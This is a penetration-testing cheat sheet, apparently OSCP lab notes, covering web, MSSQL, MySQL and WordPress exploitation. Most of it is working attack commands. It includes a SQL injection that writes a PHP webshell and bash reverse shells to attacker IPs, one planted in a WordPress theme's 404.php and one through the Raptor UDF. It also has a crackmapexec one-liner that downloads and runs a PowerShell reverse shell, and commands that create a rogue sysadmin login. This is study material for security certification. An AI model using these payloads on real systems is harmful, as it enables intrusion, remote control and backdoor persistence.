# Exploitation
This, by all means is not a full guide, but will be added to over time. There are many things here that I commonly found throughout OSCP labs.

## Resources:
* [Total OSCP Guide](https://web.archive.org/web/20221206152629/https://sushant747.gitbooks.io/total-oscp-guide/content/)
* [Hacktricks](https://book.hacktricks.xyz/welcome/readme)
## Table of Contents
1. [Web Exploits](#web-exploits)
2. [SQL Injection (SQLi)](#sql-injection-sqli)
4. [Wordpress Admin to Shell](#wordpress-admin-to-shell)
5. [Local File Inclusion (LFI) / Remote Code Inclusion (RCI) / Log Poisoning](#lfi-rci-log-poisoning)
6. [Command Injection](#command-injection)
7. [SQL Database Vulnerabilities](#sql-database-vulnerabilities)
8. [Server Message Block (SMB) Exploits](#smb-exploits)

## Web Exploits

Web applications are a common target for attackers. Understanding the various vulnerabilities and how to exploit them is crucial for any penetration tester.

Common Attacks:
* Default Credentials
* Password Spraying
* sqli login bypass
* SQLI
* LFI/RFI
* Log Poisioning
* Command Injection
* Windows IIS (ASP/ASPX)

## SQL Injection (SQLI)

[Cheat Sheet](https://github.com/brianlam38/Sec-Cheatsheets/blob/master/Web/Web_Cheatsheet.md#sql-injection)

### Authentication Bypass
[Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

### sqlmap
If working with burpsuite, we can save the request as a file. We can then run sqlmap using the request:
```
sqlmap -r burpreq -p id
```

Other Options:
`--dump`	dump the database  
`-D` DB	Database to enum  
`-T` TBL	Table to enum  
`-C` COL	Column to enum  
`-p` param	parameter to test  
`-a`	retrieve everything  
`--passwords`	enumerate passwords  
`--tables`	enumerate tables  
`--columns`	enumerate columns  


### MySQL Injection to code execution
STEP 1:  
Find the web root. Common locations:
```
C:\xampp\htdocs
/var/www/html 
```

STEP 2:  
Write PHP webshell into web root 
```
'UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\shell.php"'
'UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php'-- -'
```

STEP 3:  
Code exec 
```
$ curl -v http://[target]/shell.php?cmd=whoami
```

## Wordpress Admin to Shell

Wordpress is one of the most popular CMS platforms. This section covers how to escalate from a Wordpress admin account to obtaining a shell on the server.

### Using Plugins

```
cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
zip plugin-shell.zip plugin-shell.php
```
Upload the zip as a new plugin

### Using Themes

* Download legitimate [twentyfifteen](https://downloads.wordpress.org/theme/twentyfifteen.3.3.zip) theme.
* Unzip it and add reverse shell code to 404.php
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.119.175/1234 0>&1'");
```
* Re-zip the theme

```
zip -r vuln.zip twentyfiftee
```
* Upload theme to /wp/wp-admin/theme-install.php
* Start a netcat listener
* Visit /wp/wp-content/themes/twentyfifteen/404.php

## Local File Inclusion (LFI) / Remote Code Inclusion (RCI) / Log Poisoning

LFI and RCI are vulnerabilities that allow an attacker to include files on a server through the web browser. Log poisoning is a technique used in conjunction with LFI to execute arbitrary commands on the server.

* [Cheat Sheet](https://web.archive.org/web/20220703093125/https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)
* [Windows LFI Files](https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/)
* Using wfuzz to fuzz common lfi files:
```
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```

## Command Injection

Command injection is an attack method in which a hacker alters dynamically generated content on a web page by entering shell commands into an input mechanism, such as a form field that lacks effective validation constraints.

* [Cheat Sheet](https://gabb4r.gitbook.io/oscp-notes/cheatsheet/command-injection-cheatsheet)

## SQL Database Vulnerabilities

Databases are a prime target for attackers due to the sensitive information they hold. This section covers various vulnerabilities specific to SQL databases and how to exploit them.

### MSSQL (port 1433) Reverse Shell

**Default sysadmin account (sa):**

If we have access to a remote mssql database with privileged user credentials, we can exploit this to execute commands on the server and gain a reverse shell.

```bash
impacket-mssqlclient user:pass@10.10.10.10

```

Within SQL

```sql

EXEC xp_cmdshell 'whoami'

```

If **`xp_cmdshell`** is disabled, we need to enable it (can only be done by a user with sysadmin permissions):
```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC xp_cmdshell 'dir c:\'
```
Alternatively, **`xp_cmdshell`** can be executed from **crackmapexec**:
```bash
crackmapexec mssql 10.11.1.111 --local-auth -u 'sa' -p 'sqls3rv3r' -x 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.119.145/Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.145 -Port 443 | powershell -noprofile'
```
You can also add a new database user and assign them the role of sysadmin so that they can enable **`xp_cmdshell`**:

```sql
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
```

### MySQL (port 3306) Reverse Shell

Local Access:
```bash
mysql -u root # Connect to root without password
mysql -u root -p # prompts for password
```
Remote Access:
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
Misconfigured database could allow ordinary user to query data or create a root-level user:
```sql
SELECT * FROM mysql.user; # Get users, permissions & creds
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

```
Get a shell (with your permissions, useful for sudo/suid privesc):
```
\! sh
```

#### Raptor UDF exploit:

UDF Exploit can be found at [Raptor UDF Exploit GitHub](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c).

Compile:
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 
```
In the Victim machine:
```bash
mysql -u root
```
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('bash -c "bash -i >& /dev/tcp/192.168.119.219/443 0>&1"');
```

